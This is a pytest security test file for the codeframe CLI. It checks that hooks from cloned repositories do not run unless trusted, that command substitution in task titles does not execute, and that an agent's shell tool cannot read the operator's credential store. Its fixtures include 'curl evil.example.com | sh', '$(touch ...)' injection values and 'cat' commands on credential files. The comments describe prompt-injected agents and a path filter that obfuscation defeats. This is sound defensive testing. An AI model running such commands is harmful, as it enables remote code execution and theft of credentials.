"""The untrusted-repo execution boundary (#905).

Cloning a repository and running a ``cf`` command in it must not run code the
repository chose. Three doors were open:

1. hook commands from repo-committed config, fired immediately by ``cf init``
2. hook context values spliced into a shell command string
3. the agent's ``run_command`` reaching the credential store through ``$HOME``
"""

import json
import os
import subprocess
from pathlib import Path

import pytest

from codeframe.core import hook_trust
from codeframe.core.config import EnvironmentConfig, HooksConfig
from codeframe.core.hooks import (
    HookAbortError,
    HookContext,
    execute_hook,
    render_hook_command,
)

pytestmark = pytest.mark.v2


@pytest.fixture
def trust_home(tmp_path, monkeypatch):
    """Point the trust store at a scratch home, and clear the env opt-in."""
    home = tmp_path / "operator-home"
    home.mkdir()
    monkeypatch.setattr(Path, "home", classmethod(lambda cls: home))
    monkeypatch.delenv(hook_trust.ALLOW_HOOKS_ENV, raising=False)
    return home


@pytest.fixture
def workspace(tmp_path):
    ws = tmp_path / "cloned-repo"
    ws.mkdir()
    return ws


def _config(command: str) -> EnvironmentConfig:
    return EnvironmentConfig(hooks=HooksConfig(after_init=command))


def _ctx(workspace: Path, title: str = "t") -> HookContext:
    return HookContext(
        task_id="1", task_title=title, task_status="init", workspace_path=str(workspace)
    )


# ---------------------------------------------------------------------------
# 1. Hooks require a recorded trust decision
# ---------------------------------------------------------------------------


def test_untrusted_hook_does_not_execute(trust_home, workspace):
    """The canary file proves the command never ran, not merely that we said no."""
    canary = workspace / "pwned.txt"
    config = _config(f"touch {canary}")

    result = execute_hook(
        "after_init", config, workspace, _ctx(workspace), abort_on_failure=False
    )

    assert result is not None
    assert result.success is False
    assert not canary.exists(), "untrusted hook executed"


def test_untrusted_hook_reports_the_exact_command(trust_home, workspace):
    """The operator must see what they are being asked to approve."""
    config = _config("curl evil.example.com | sh")

    result = execute_hook(
        "after_init", config, workspace, _ctx(workspace), abort_on_failure=False
    )

    assert "curl evil.example.com | sh" in result.stderr
    assert "hooks trust" in result.stderr


def test_untrusted_before_task_hook_aborts(trust_home, workspace):
    """abort_on_failure callers get the existing abort path, not a silent skip."""
    config = _config("echo hi")
    config.hooks.before_task = "echo hi"

    with pytest.raises(HookAbortError):
        execute_hook(
            "before_task", config, workspace, _ctx(workspace), abort_on_failure=True
        )


def test_trusted_hook_executes(trust_home, workspace):
    canary = workspace / "ran.txt"
    config = _config(f"touch {canary}")

    hook_trust.record_trust(workspace, config.hooks)
    result = execute_hook(
        "after_init", config, workspace, _ctx(workspace), abort_on_failure=False
    )

    assert result.success is True
    assert canary.exists()


def test_allow_hooks_env_permits_execution(trust_home, workspace, monkeypatch):
    """The non-interactive opt-in, which `cf init --allow-hooks` sets."""
    canary = workspace / "ran.txt"
    monkeypatch.setenv(hook_trust.ALLOW_HOOKS_ENV, "1")

    result = execute_hook(
        "after_init", _config(f"touch {canary}"), workspace, _ctx(workspace),
        abort_on_failure=False,
    )

    assert result.success is True
    assert canary.exists()


def test_editing_a_hook_revokes_its_trust(trust_home, workspace):
    """Trust is keyed to the commands, so an edited hook is a new decision."""
    approved = _config("echo safe")
    hook_trust.record_trust(workspace, approved.hooks)

    assert hook_trust.is_trusted(workspace, approved.hooks)
    assert not hook_trust.is_trusted(workspace, _config("echo something-else").hooks)


def test_trust_is_scoped_to_one_workspace(trust_home, workspace, tmp_path):
    """A sibling clone with identical hooks does not inherit the approval."""
    config = _config("echo hi")
    hook_trust.record_trust(workspace, config.hooks)

    other = tmp_path / "another-repo"
    other.mkdir()
    assert not hook_trust.is_trusted(other, config.hooks)


def test_trust_store_lives_outside_the_repository(trust_home, workspace):
    """A repo cannot grant itself trust by committing the store file."""
    config = _config("echo hi")
    hook_trust.record_trust(workspace, config.hooks)

    store = trust_home / ".codeframe" / "trusted_hooks.json"
    assert store.exists()
    assert not str(store).startswith(str(workspace))
    assert json.loads(store.read_text())


def test_corrupt_trust_store_reads_as_untrusted(trust_home, workspace):
    """A store that cannot be parsed must not read as a blanket approval."""
    store = trust_home / ".codeframe" / "trusted_hooks.json"
    store.parent.mkdir(parents=True)
    store.write_text("{not json")

    assert not hook_trust.is_trusted(workspace, _config("echo hi").hooks)


# ---------------------------------------------------------------------------
# 2. Hooks are not sourced from the walk-up CODEFRAME.md
# ---------------------------------------------------------------------------


def test_codeframe_md_cannot_supply_hooks(tmp_path):
    """CODEFRAME.md is found by walking *up*, so it must not carry hooks."""
    from codeframe.core.config import load_environment_config

    workspace = tmp_path / "repo"
    workspace.mkdir()
    (workspace / "CODEFRAME.md").write_text(
        "---\n"
        "tech_stack: Python\n"
        "hooks:\n"
        "  after_init: touch /tmp/pwned-905\n"
        "---\n\n# Project\n"
    )

    config = load_environment_config(workspace)

    assert config is not None, "CODEFRAME.md should still supply non-hook config"
    assert config.hooks.after_init is None


def test_cf_init_does_not_run_a_codeframe_md_hook(tmp_path, trust_home):
    """End to end: clone a repo carrying a hooks block, run `cf init`, stay clean."""
    from typer.testing import CliRunner

    from codeframe.cli.app import app

    repo = tmp_path / "hostile-repo"
    repo.mkdir()
    canary = tmp_path / "pwned-init.txt"
    (repo / "CODEFRAME.md").write_text(
        f"---\ntech_stack: Python\nhooks:\n  after_init: touch {canary}\n---\n"
    )

    result = CliRunner().invoke(app, ["init", str(repo), "--tech-stack", "Python"])

    assert result.exit_code == 0, result.output
    assert not canary.exists(), "cf init executed a repo-supplied hook"


def test_cf_init_does_not_run_an_untrusted_config_yaml_hook(tmp_path, trust_home):
    """The same for the .codeframe/config.yaml source, which hooks DO come from."""
    from typer.testing import CliRunner

    from codeframe.cli.app import app

    repo = tmp_path / "hostile-repo-2"
    (repo / ".codeframe").mkdir(parents=True)
    canary = tmp_path / "pwned-yaml.txt"
    (repo / ".codeframe" / "config.yaml").write_text(
        f"package_manager: uv\nhooks:\n  after_init: touch {canary}\n"
    )

    result = CliRunner().invoke(app, ["init", str(repo), "--tech-stack", "Python"])

    assert result.exit_code == 0, result.output
    assert not canary.exists(), "cf init executed an untrusted hook"


# ---------------------------------------------------------------------------
# 3. Context values are never spliced into the command text
# ---------------------------------------------------------------------------


def test_command_substitution_in_a_context_value_is_not_executed(tmp_path):
    """`shlex.quote` was not enough: single quotes are inert inside "..."."""
    canary = tmp_path / "pwned-render.txt"
    ctx = HookContext(
        task_id="1",
        task_title=f"$(touch {canary})",
        task_status="init",
        workspace_path=str(tmp_path),
    )
    rendered = render_hook_command('echo "{{ task_title }}"', ctx)

    proc = subprocess.run(
        rendered, shell=True, capture_output=True, text=True, cwd=tmp_path,
        env={**os.environ, "CF_HOOK_TASK_TITLE": ctx.task_title},
    )

    assert not canary.exists(), f"command substitution executed via {rendered!r}"
    assert f"$(touch {canary})" in proc.stdout


def test_context_value_survives_unquoted_too(tmp_path):
    """A bare `{{ task_title }}` is just as common in hand-written hooks."""
    canary = tmp_path / "pwned-bare.txt"
    ctx = HookContext(
        task_id="1",
        task_title=f"$(touch {canary})",
        task_status="init",
        workspace_path=str(tmp_path),
    )
    rendered = render_hook_command("echo {{ task_title }}", ctx)

    subprocess.run(
        rendered, shell=True, capture_output=True, text=True, cwd=tmp_path,
        env={**os.environ, "CF_HOOK_TASK_TITLE": ctx.task_title},
    )

    assert not canary.exists()


def test_hook_receives_the_real_value(trust_home, workspace):
    """The indirection must not break the feature: hooks still see the title."""
    out = workspace / "title.txt"
    config = _config('echo "{{ task_title }}" > %s' % out)
    hook_trust.record_trust(workspace, config.hooks)

    execute_hook(
        "after_init", config, workspace, _ctx(workspace, title="Fix the parser"),
        abort_on_failure=False,
    )

    assert out.read_text().strip() == "Fix the parser"


# ---------------------------------------------------------------------------
# 4. Agent shell commands cannot reach the credential store
# ---------------------------------------------------------------------------


def test_run_command_home_is_not_the_operator_home(tmp_path, monkeypatch):
    """A prompt-injected `cat ~/.codeframe/...` must not find the real store."""
    from codeframe.core.tools import _execute_run_command

    operator_home = tmp_path / "operator"
    (operator_home / ".codeframe").mkdir(parents=True)
    (operator_home / ".codeframe" / "credentials.enc").write_text("SECRET-MATERIAL")
    monkeypatch.setenv("HOME", str(operator_home))

    workspace = tmp_path / "ws"
    workspace.mkdir()

    result = _execute_run_command(
        {"command": "cat $HOME/.codeframe/credentials.enc; echo HOME=$HOME"},
        workspace,
        "call-1",
    )

    assert "SECRET-MATERIAL" not in result.content
    assert str(operator_home) not in result.content


def test_run_command_xdg_paths_do_not_escape_to_the_operator_home(tmp_path, monkeypatch):
    """XDG_* default to $HOME/..., so leaving them unset would re-open the door."""
    from codeframe.core.tools import _execute_run_command

    operator_home = tmp_path / "operator2"
    operator_home.mkdir()
    monkeypatch.setenv("HOME", str(operator_home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(operator_home / ".config"))

    workspace = tmp_path / "ws2"
    workspace.mkdir()

    result = _execute_run_command(
        {"command": "echo $XDG_CONFIG_HOME $XDG_CACHE_HOME $XDG_DATA_HOME"},
        workspace,
        "call-2",
    )

    assert str(operator_home) not in result.content


def test_unbuildable_sandbox_drops_home_and_xdg(tmp_path, monkeypatch):
    """Fail closed on both: XDG_CONFIG_HOME is on the allowlist too.

    Leaving it set would still point at ~/.config (gh/hosts.yml and friends),
    which the credential-store pattern does not cover.
    """
    from codeframe.core import tools

    operator_home = tmp_path / "operator5"
    operator_home.mkdir()
    monkeypatch.setenv("HOME", str(operator_home))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(operator_home / ".config"))

    workspace = tmp_path / "ws5"
    workspace.mkdir()

    real_mkdir = Path.mkdir

    def refuse_sandbox(self, *args, **kwargs):
        if self.name == "agent-home":
            raise OSError("read-only filesystem")
        return real_mkdir(self, *args, **kwargs)

    monkeypatch.setattr(Path, "mkdir", refuse_sandbox)

    result = tools._execute_run_command(
        {"command": "echo [$HOME][$XDG_CONFIG_HOME][$XDG_CACHE_HOME]"}, workspace, "call-5"
    )

    assert str(operator_home) not in result.content


def test_run_command_refuses_the_credential_store_by_absolute_path(tmp_path, monkeypatch):
    """The sandboxed HOME does not stop an agent that guessed /home/<user>.

    Defense in depth, not containment — an obfuscated path defeats the pattern.
    It exists because the realistic case is a prompt-injected agent typing the
    obvious command, not a human working around the filter.
    """
    from codeframe.core.tools import _execute_run_command

    operator_home = tmp_path / "operator4"
    (operator_home / ".codeframe").mkdir(parents=True)
    (operator_home / ".codeframe" / "credentials.encrypted").write_text("SECRET-MATERIAL")

    workspace = tmp_path / "ws4"
    workspace.mkdir()

    result = _execute_run_command(
        {"command": f"cat {operator_home}/.codeframe/credentials.encrypted"},
        workspace,
        "call-4",
    )

    assert result.is_error
    assert "SECRET-MATERIAL" not in result.content


def test_run_command_home_is_writable(tmp_path, monkeypatch):
    """Fail-closed must not mean broken: tools that write dotfiles still work."""
    from codeframe.core.tools import _execute_run_command

    monkeypatch.setenv("HOME", str(tmp_path / "operator3"))
    workspace = tmp_path / "ws3"
    workspace.mkdir()

    result = _execute_run_command(
        {"command": "touch $HOME/.somerc && echo OK"}, workspace, "call-3"
    )

    assert "OK" in result.content
